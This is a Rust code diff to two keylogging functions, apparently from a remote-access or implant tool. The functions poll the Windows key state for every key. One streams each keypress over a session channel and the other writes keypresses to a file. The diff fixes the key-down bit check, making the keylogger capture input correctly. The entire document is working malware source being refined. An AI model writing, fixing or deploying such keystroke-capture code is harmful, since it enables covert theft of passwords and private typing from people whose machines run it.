@@ -256,7 +256,10 @@ pub fn keylog(seconds: u64) -> Result<crate::sessions::Stream, String> {
         let mut previous = [false; 256];
         while std::time::Instant::now() < deadline {
             for vk in 0x08u16..=0xFEu16 {
-                let down = unsafe { sys::GetAsyncKeyState(vk as i32) & 0x8000 } != 0;
+                // GetAsyncKeyState returns a SHORT whose highest bit is the
+                // "down" flag; the mask is a 32-bit constant, so the return
+                // is widened before the bit is looked at.
+                let down = unsafe { (sys::GetAsyncKeyState(vk as i32) as i32 & 0x8000) != 0 };
                 if down && !previous[vk as usize] {
                     let line = format!("{}\n", describe(vk));
                     if tx.send(line.into_bytes()).is_err() {
@@ -299,7 +302,10 @@ pub fn keylog_to_file(path: &str, seconds: u64) -> Result<String, String> {
         let mut previous = [false; 256];
         while std::time::Instant::now() < deadline {
             for vk in 0x08u16..=0xFEu16 {
-                let down = unsafe { sys::GetAsyncKeyState(vk as i32) & 0x8000 } != 0;
+                // GetAsyncKeyState returns a SHORT whose highest bit is the
+                // "down" flag; the mask is a 32-bit constant, so the return
+                // is widened before the bit is looked at.
+                let down = unsafe { (sys::GetAsyncKeyState(vk as i32) as i32 & 0x8000) != 0 };
                 if down && !previous[vk as usize] {
                     let _ = writeln!(file, "{}", describe(vk));
                 }
